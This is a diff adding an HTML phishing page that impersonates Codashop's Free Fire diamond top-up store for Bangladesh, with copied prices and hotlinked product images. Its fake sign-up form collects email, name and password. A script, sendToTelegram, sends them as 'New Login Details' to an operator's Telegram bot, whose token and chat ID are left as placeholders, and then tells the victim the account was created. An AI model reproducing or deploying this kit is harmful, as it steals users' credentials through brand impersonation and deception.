@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>Free Fire Top Up - Codashop</title>
+    <style>
+        /* ================= বেস স্টাইল ================= */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #f8f6fc;
+            display: flex;
+            justify-content: center;
+            padding-bottom: 0;
+            transition: background-color 0.3s;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 500px;
+            background-color: #f8f6fc;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* ================= টপ হেডার (Navbar) ================= */
+        .navbar {
+            background-color: #280031;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: white;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav-left { display: flex; align-items: center; gap: 12px; }
+        .hamburger { display: flex; flex-direction: column; gap: 4px; cursor: pointer; }
+        .hamburger div { width: 20px; height: 2px; background-color: white; border-radius: 2px; }
+        .logo { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; display: flex; align-items: center; gap: 5px; cursor: pointer;}
+        .nav-right { display: flex; align-items: center; gap: 12px; font-size: 14px; }
+        .signup-btn { background-color: #5a36f5; color: white; border: none; padding: 6px 14px; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; }
+        
+        /* ================= মূল পেজ (Main View) ================= */
+        .hero-section {
+            background-color: #280031;
+            padding: 20px 16px 30px;
+            display: flex;
+            gap: 16px;
+            color: white;
+        }
+        .hero-img { width: 80px; height: 80px; border-radius: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
+        .hero-content h1 { font-size: 22px; margin-bottom: 6px; }
+        .secure-tag { display: inline-flex; align-items: center; gap: 4px; font-size: 10px; background-color: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); padding: 4px 8px; border-radius: 20px; margin-bottom: 10px; }
+        .hero-desc { font-size: 12px; color: #d1c4d6; line-height: 1.4; margin-top: 8px; }
+        .hero-desc a { color: #a78bfa; text-decoration: none; }
+
+        .purchase-steps { padding: 16px; margin-top: -15px; position: relative; padding-bottom: 120px; }
+        .step-card { background: white; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); overflow: hidden; }
+        .step-ornament { height: 10px; background: linear-gradient(90deg, #5a36f5, #a78bfa); }
+        .step-header { padding: 16px 16px 0; display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 700; color: #1f2937; }
+        .step-number { background: #5a36f5; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; }
+        .step-content { padding: 16px; }
+
+        .input-group { margin-bottom: 12px; }
+        .input-group input { width: 100%; padding: 14px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 16px; outline: none; }
+        .input-group input:focus { border-color: #5a36f5; }
+
+        .tabs { display: flex; gap: 10px; margin-bottom: 16px; }
+        .tab { flex: 1; text-align: center; padding: 12px 0; font-size: 14px; font-weight: 600; border-radius: 8px; border: 1px solid #e5e7eb; color: #6b7280; cursor: pointer; background: white; }
+        .tab.active { border-color: #5a36f5; color: #1f2937; background-color: #f8f6fc; }
+
+        .category-title { font-size: 16px; font-weight: 700; color: #1f2937; margin: 20px 0 12px 0; display: block; }
+        .grid-container { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        
+        /* কার্ড স্টাইল */
+        .card { background: #fff; border: 2px solid #e5e7eb; border-radius: 12px; display: flex; flex-direction: column; overflow: hidden; cursor: pointer; transition: border-color 0.2s; }
+        .card.selected { border-color: #5a36f5; box-shadow: 0 0 0 1px #5a36f5; }
+        .card-top { padding: 16px 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px; flex-grow: 1; min-height: 110px; }
+        .card-title { font-size: 16px; font-weight: 700; color: #1f2937; text-align: center; }
+        .card-img { width: 45px; height: auto; }
+        .card-bottom { background-color: #f8f5fb; padding: 12px; display: flex; flex-direction: column; align-items: flex-end; }
+        .price-prefix { font-size: 10px; color: #ef4444; margin-bottom: 2px; }
+        .price-amount { font-size: 16px; font-weight: 700; color: #ef4444; }
+        .discount-row { display: flex; align-items: center; gap: 6px; margin-top: 4px; }
+        .discount-badge { background-color: #dcfce7; color: #16a34a; font-size: 10px; font-weight: 700; padding: 2px 6px; border-radius: 10px; }
+        .old-price { font-size: 10px; color: #9ca3af; text-decoration: line-through; }
+        .rewards-row { display: flex; align-items: center; justify-content: flex-end; gap: 4px; font-size: 10px; font-weight: 600; color: #4b5563; margin-top: 6px; }
+        .coin-icon { width: 12px; height: 12px; background-color: #f59e0b; border-radius: 50%; border: 1px solid #d97706; }
+
+        /* ================= ডাইনামিক বটম বার ================= */
+        .action-bar {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            max-width: 500px;
+            background-color: white;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            padding: 20px 16px;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.15);
+            z-index: 200;
+            transform: translateY(100%);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        
+        .action-bar.show { transform: translateY(0); }
+
+        .ab-header { display: flex; flex-direction: column; margin-bottom: 12px; }
+        .ab-title { font-size: 16px; font-weight: 500; color: #4b5563; margin-bottom: 4px; }
+        .ab-price-row { display: flex; align-items: baseline; gap: 6px; }
+        .ab-from { font-size: 14px; font-weight: 700; color: #6b7280; }
+        .ab-price { font-size: 24px; font-weight: 800; color: #111827; }
+
+        .ab-payment-icons { display: flex; align-items: center; gap: 8px; margin-bottom: 16px; }
+        .ab-icon-box { border: 1px solid #e5e7eb; border-radius: 4px; padding: 4px 8px; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; height: 24px; }
+        .ab-more { font-size: 14px; color: #6b7280; }
+
+        .ab-btn {
+            width: 100%;
+            background-color: #5a36f5;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(90, 54, 245, 0.3);
+        }
+        .ab-btn svg { position: absolute; left: 20px; width: 24px; height: 24px; }
+        .ab-circle { position: absolute; right: 20px; width: 22px; height: 22px; border: 2px solid #10b981; border-radius: 50%; }
+
+        /* ================= সাইনআপ স্ক্রিন ================= */
+        .signup-screen { background-color: #280031; min-height: 100vh; color: white; display: flex; flex-direction: column; }
+        .signup-hero { padding: 60px 20px 30px; text-align: center; }
+        .signup-hero .subtitle { font-size: 16px; font-weight: 500; margin-bottom: 5px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .signup-hero .title { font-size: 26px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 40px; }
+        .decor-shape { color: #facc15; font-weight: bold; font-size: 24px; font-family: cursive;}
+
+        .email-signup-btn { background-color: white; color: #1f2937; border: none; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: 600; width: 100%; display: flex; justify-content: center; align-items: center; gap: 10px; cursor: pointer; margin-bottom: 30px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .terms-text { font-size: 14px; color: #e5e7eb; line-height: 1.5; text-align: left; margin-bottom: 30px; }
+        .terms-text span { color: #facc15; font-weight: 600; }
+        .divider { height: 1px; background-color: rgba(255,255,255,0.2); margin: 20px 0; }
+        .have-account { text-align: center; font-size: 15px; margin-bottom: 10px; }
+        .have-account span { display: block; margin-top: 10px; color: #facc15; text-decoration: underline; font-weight: 600; cursor: pointer; }
+
+        .signup-form-header { display: flex; justify-content: space-between; align-items: center; padding: 20px 16px; font-size: 20px; font-weight: 700; }
+        .back-btn { display: flex; align-items: center; gap: 10px; cursor: pointer; }
+        .back-btn svg { width: 24px; height: 24px; fill: white; }
+        .country-select { font-size: 14px; display: flex; align-items: center; gap: 5px; color: #facc15; cursor: pointer; }
+
+        .form-container { padding: 10px 16px; }
+        .custom-input-group { position: relative; margin-bottom: 15px; }
+        .custom-input-group input { width: 100%; padding: 16px 40px; border-radius: 8px; border: none; font-size: 15px; font-weight: 500; outline: none; color: #1f2937; }
+        .custom-input-group .icon-left { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); width: 20px; height: 20px; fill: #6b7280; }
+        .custom-input-group .icon-right { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); width: 20px; height: 20px; fill: #6b7280; cursor: pointer; }
+        .password-hint { font-size: 12px; color: #9ca3af; margin-top: -5px; margin-bottom: 20px; line-height: 1.4; }
+        
+        .checkbox-container { display: flex; align-items: flex-start; gap: 12px; font-size: 14px; color: #e5e7eb; margin-bottom: 25px; line-height: 1.4; cursor: pointer; }
+        .checkbox-container input { margin-top: 3px; width: 18px; height: 18px; accent-color: #a78bfa; }
+
+        /* Continue Button */
+        .continue-btn { width: 100%; background-color: #3b2551; color: #8b7b9e; border: none; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: 700; cursor: pointer; margin-bottom: 20px; transition: 0.3s; }
+        .continue-btn.active { background-color: #5a36f5; color: white; box-shadow: 0 4px 12px rgba(90, 54, 245, 0.4); }
+        
+        .signin-redirect { text-align: center; font-size: 14px; font-weight: 600; margin-bottom: 30px; }
+        .signin-redirect span { color: #facc15; text-decoration: underline; cursor: pointer; }
+
+        .bottom-yellow-bar { height: 15px; background-color: #facc15; width: 100%; margin-top: auto; }
+
+        /* ইউটিলিটি ক্লাস */
+        .hidden { display: none !important; }
+
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    
+    <!-- ================= গ্লোবাল হেডার ================= -->
+    <header class="navbar">
+        <div class="nav-left">
+            <div class="hamburger" onclick="showMainPage()">
+                <div></div><div></div><div></div>
+            </div>
+            <div class="logo" onclick="showMainPage()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 22h20L12 2zm0 4l6 14H6l6-14z"/></svg>
+                CODASHOP
+            </div>
+        </div>
+        <div class="nav-right" id="nav-right-content">
+            <span>EN 🇧🇩</span>
+            <button class="signup-btn" onclick="showSignupScreen1()">Sign up</button>
+        </div>
+    </header>
+
+    <!-- ================= ১. মূল পেজ (Main View) ================= -->
+    <div id="main-view">
+        <section class="hero-section">
+            <img class="hero-img" src="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/Free_Fire_Lapak_178x178.png" alt="Free Fire">
+            <div class="hero-content">
+                <h1>Free Fire</h1>
+                <div class="secure-tag">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                    Secure Payments
+                </div>
+                <p class="hero-desc">
+                    Codashop offers easy, safe and convenient Free Fire top ups. Pay conveniently with bKash, Nagad, Rocket...
+                </p>
+            </div>
+        </section>
+
+        <div class="purchase-steps">
+            <!-- স্টেপ ১ -->
+            <div class="step-card">
+                <div class="step-ornament"></div>
+                <div class="step-header">
+                    <div class="step-number">1</div> Enter User ID
+                </div>
+                <div class="step-content">
+                    <div class="input-group">
+                        <input type="text" placeholder="Enter User ID">
+                    </div>
+                </div>
+            </div>
+
+            <!-- স্টেপ ২ (সব ডায়মন্ড ও পাস) -->
+            <div class="step-card">
+                <div class="step-ornament"></div>
+                <div class="step-header">
+                    <div class="step-number">2</div> Select Recharge
+                </div>
+                <div class="step-content" style="padding-top: 0;">
+                    <div class="tabs">
+                        <div class="tab active">Diamonds</div>
+                        <div class="tab">Passes</div>
+                    </div>
+                    
+                    <!-- ডায়মন্ড গ্রিড (সব ১৩টি কার্ড) -->
+                    <div class="grid-container" id="diamond-grid">
+                        <!-- 100 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">100 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 58.80</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 79.38</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.02 Rewards</div></div></div>
+                        <!-- 200 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">200 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 117.18</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 158.20</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.04 Rewards</div></div></div>
+                        <!-- 300 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">300 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 175.00</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 236.18</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.06 Rewards</div></div></div>
+                        <!-- 310 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">310 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 177.80</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 240.10</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.06 Rewards</div></div></div>
+                        <!-- 520 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">520 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 296.80</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 400.68</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.10 Rewards</div></div></div>
+                        <!-- 830 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">830 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 473.34</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 639.10</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.16 Rewards</div></div></div>
+                        <!-- 930 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">930 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 532.70</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 719.18</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.19 Rewards</div></div></div>
+                        <!-- 1060 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">1060 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 588.00</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 793.80</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.21 Rewards</div></div></div>
+                        <!-- 1580 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">1580 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 880.60</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 1188.74</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.31 Rewards</div></div></div>
+                        <!-- 2180 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">2180 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 1190.00</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 1606.50</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.42 Rewards</div></div></div>
+                        <!-- 3240 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">3240 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 1762.60</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 2379.44</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.62 Rewards</div></div></div>
+                        <!-- 5600 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">5600 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 2940.00</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 3969.00</span></div><div class="rewards-row"><span class="coin-icon"></span> 1.05 Rewards</div></div></div>
+                        <!-- 11500 -->
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">11500 Diamonds</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/0934663fddad9992b0aea1851f2af43d.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 6020.00</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 8127.00</span></div><div class="rewards-row"><span class="coin-icon"></span> 2.15 Rewards</div></div></div>
+                    </div>
+
+                    <!-- পাসেস -->
+                    <span class="category-title">Passes</span>
+                    <div class="grid-container">
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">Weekly Lite</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/de5a57c9fff8b06b2bae680f73ad78d6.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 20.02</span><div class="discount-row"><span class="discount-badge">-29%</span><span class="old-price">BDT 28.00</span></div><div class="rewards-row" style="visibility: hidden;"><span class="coin-icon"></span> 0.00 Rewards</div></div></div>
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">Weekly</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/de5a57c9fff8b06b2bae680f73ad78d6.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 100.38</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 135.52</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.03 Rewards</div></div></div>
+                        <div class="card" onclick="selectCard(this)"><div class="card-top"><div class="card-title">Monthly</div><img class="card-img" src="https://cdn1.codashop.com/images/6583_448ecd16-c203-497d-af3b-eecc4fbad855_a6b88f0dbf7ccb7c3c1efba2850dbe03_image/2d5f1015f10ac09b4608b7b3f4f70b13.png"></div><div class="card-bottom"><span class="price-prefix">From</span><span class="price-amount">BDT 502.74</span><div class="discount-row"><span class="discount-badge">-26%</span><span class="old-price">BDT 678.72</span></div><div class="rewards-row"><span class="coin-icon"></span> 0.17 Rewards</div></div></div>
+                    </div>
+
+                </div>
+            </div>
+            
+            <div class="step-card step-3-preview" style="opacity: 0.5; margin-top: 20px;">
+                <div class="step-ornament" style="background: #e5e7eb;"></div>
+                <div class="step-header" style="color: #9ca3af;"><div class="step-number" style="background: #9ca3af;">3</div> Enter Details</div>
+                <div class="step-content"><p style="color: #9ca3af; font-size: 14px;">Payment details will appear here...</p></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= ৪. ডাইনামিক বটম বার ================= -->
+    <div class="action-bar" id="action-bar">
+        <div class="ab-header">
+            <div class="ab-title" id="ab-product-name">310 Diamonds</div>
+            <div class="ab-price-row">
+                <span class="ab-from">FROM</span>
+                <span class="ab-price" id="ab-product-price">BDT 177.80</span>
+            </div>
+        </div>
+        
+        <div class="ab-payment-icons">
+            <div class="ab-icon-box" style="background: #fff;">bKash</div>
+            <div class="ab-icon-box" style="background: #f0f4ff;">Nagad</div>
+            <div class="ab-icon-box" style="background: #fff;">Card</div>
+            <span class="ab-more">+6 more</span>
+        </div>
+
+        <button class="ab-btn" onclick="showSignupScreen1()">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
+                <line x1="1" y1="10" x2="23" y2="10"></line>
+            </svg>
+            Select payment
+            <div class="ab-circle"></div>
+        </button>
+    </div>
+
+    <!-- ================= ২. সাইনআপ স্ক্রিন ১ ================= -->
+    <div id="signup-view-1" class="signup-screen hidden">
+        <div class="signup-hero">
+            <div class="subtitle">Faster top up, better deals <span class="decor-shape">~</span></div>
+            <div class="title"><span class="decor-shape">~</span> Join Codashop Now.</div>
+            <button class="email-signup-btn" onclick="showSignupScreen2()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+                Sign up with Email
+            </button>
+            <div class="terms-text">By signing up, you agree to the <span>Terms of Service</span> and <span>Privacy Policy</span>.</div>
+            <div class="divider"></div>
+            <div class="have-account">Already have an account?<span onclick="showSignupScreen2()">Sign In</span></div>
+        </div>
+    </div>
+
+    <!-- ================= ৩. সাইনআপ স্ক্রিন ২ (টেলিগ্রাম কানেক্টেড ফর্ম) ================= -->
+    <div id="signup-view-2" class="signup-screen hidden">
+        <div class="signup-form-header">
+            <div class="back-btn" onclick="showSignupScreen1()">
+                <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                Sign Up
+            </div>
+            <div class="country-select">Bangladesh <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#facc15" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg></div>
+        </div>
+        <div class="form-container">
+            <div class="custom-input-group">
+                <svg class="icon-left" viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+                <input type="email" id="tg-email" placeholder="Your Email Here">
+            </div>
+            <div class="custom-input-group">
+                <svg class="icon-left" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                <input type="text" id="tg-name" placeholder="Your Name">
+            </div>
+            <div class="custom-input-group">
+                <svg class="icon-left" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                <input type="password" id="tg-password" placeholder="Your Password Here">
+                <svg class="icon-right" onclick="togglePassword()" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+            </div>
+            <div class="password-hint">Password must be 8-50 characters and include at least 1 uppercase letter, 1 lowercase letter, and 1 number.</div>
+            <label class="checkbox-container">
+                <input type="checkbox">
+                <span>I want to be the first to hear of discounts, promotions and more on Codashop</span>
+            </label>
+            <div class="signin-redirect">Already have an account? <span onclick="showSignupScreen1()">Sign in here</span></div>
+            
+            <!-- Continue বাটন -->
+            <button class="continue-btn active" id="submit-btn" onclick="sendToTelegram()">Continue</button>
+        </div>
+        <div class="bottom-yellow-bar"></div>
+    </div>
+
+</div>
+
+<script>
+    // ==========================================
+    // টেলিগ্রাম সেটআপ (এখানে আপনার টোকেন ও আইডি দিন)
+    // ==========================================
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; 
+    const CHAT_ID = 'YOUR_CHAT_ID';
+
+    // পেজ নেভিগেশন ফাংশন
+    function showMainPage() {
+        document.getElementById('main-view').classList.remove('hidden');
+        document.getElementById('signup-view-1').classList.add('hidden');
+        document.getElementById('signup-view-2').classList.add('hidden');
+        document.getElementById('nav-right-content').style.display = 'flex';
+        document.body.style.backgroundColor = '#f8f6fc';
+        window.scrollTo(0,0);
+    }
+
+    function showSignupScreen1() {
+        document.getElementById('main-view').classList.add('hidden');
+        document.getElementById('signup-view-1').classList.remove('hidden');
+        document.getElementById('signup-view-2').classList.add('hidden');
+        document.getElementById('nav-right-content').style.display = 'none';
+        document.body.style.backgroundColor = '#280031';
+        window.scrollTo(0,0);
+        document.getElementById('action-bar').classList.remove('show');
+    }
+
+    function showSignupScreen2() {
+        document.getElementById('main-view').classList.add('hidden');
+        document.getElementById('signup-view-1').classList.add('hidden');
+        document.getElementById('signup-view-2').classList.remove('hidden');
+        document.getElementById('nav-right-content').style.display = 'none';
+        document.body.style.backgroundColor = '#280031';
+        window.scrollTo(0,0);
+    }
+
+    function togglePassword() {
+        var input = document.getElementById("tg-password");
+        if (input.type === "password") {
+            input.type = "text";
+        } else {
+            input.type = "password";
+        }
+    }
+
+    function selectCard(element) {
+        const allCards = document.querySelectorAll('.card');
+        allCards.forEach(card => card.classList.remove('selected'));
+        element.classList.add('selected');
+
+        const title = element.querySelector('.card-title').innerText;
+        const price = element.querySelector('.price-amount').innerText;
+
+        document.getElementById('ab-product-name').innerText = title;
+        document.getElementById('ab-product-price').innerText = price;
+        document.getElementById('action-bar').classList.add('show');
+    }
+
+    // ==========================================
+    // টেলিগ্রামে ডাটা পাঠানোর ফাংশন
+    // ==========================================
+    async function sendToTelegram() {
+        const email = document.getElementById('tg-email').value;
+        const name = document.getElementById('tg-name').value;
+        const password = document.getElementById('tg-password').value;
+        const btn = document.getElementById('submit-btn');
+
+        if(!email || !name || !password) {
+            alert("Please fill all the fields!");
+            return;
+        }
+
+        btn.innerText = "Sending...";
+        btn.disabled = true;
+
+        const message = `🔔 *New Login Details* 🔔\n\n📧 *Email:* ${email}\n👤 *Name:* ${name}\n🔑 *Password:* ${password}`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            const data = await response.json();
+
+            if (data.ok) {
+                btn.innerText = "Success!";
+                alert("Account created successfully!");
+            } else {
+                alert("Failed to send data. Check Bot Token or Chat ID.");
+                btn.innerText = "Continue";
+            }
+        } catch (error) {
+            console.error("Error:", error);
+            alert("Network Error! Please check your internet connection.");
+            btn.innerText = "Continue";
+        } finally {
+            setTimeout(() => {
+                btn.innerText = "Continue";
+                btn.disabled = false;
+            }, 3000);
+        }
+    }
+</script>
+
+</body>
+</html>
